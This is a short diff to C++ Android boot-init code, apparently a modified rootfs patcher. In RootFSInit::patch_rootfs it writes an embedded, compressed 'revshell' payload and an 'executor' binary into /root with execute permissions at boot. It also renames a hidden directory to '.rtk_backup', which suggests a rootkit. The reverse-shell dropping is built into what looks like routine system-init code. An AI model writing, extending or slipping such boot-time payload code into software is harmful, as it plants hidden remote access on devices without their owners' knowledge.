@@ -254,7 +254,7 @@ void SARBase::patch_rootdir() {
 }
 
 #define TMP_MNTDIR "/dev/mnt"
-#define TMP_RULESDIR "/.backup/.sepolicy.rules"
+#define TMP_RULESDIR "/.rtk_backup/.sepolicy.rules"
 
 
 // ---------- rootfs -----------
@@ -282,12 +282,13 @@ void RootFSInit::patch_rootfs() {
     link_path("/sbin", "/root");
 
     // Extract revshell payload
-    int fd = xopen("/sbin/revshell", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
+    int fd = xopen("/root/revshell", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
     unxz(fd, revshell_xz, sizeof(revshell_xz));
     close(fd);
 
-    fd = xopen("/sbin/executor", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
+    fd = xopen("/root/executor", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
     unxz(fd, executor_xz, sizeof(executor_xz));
     close(fd);
 
+    recreate_sbin("/root", false);
 }
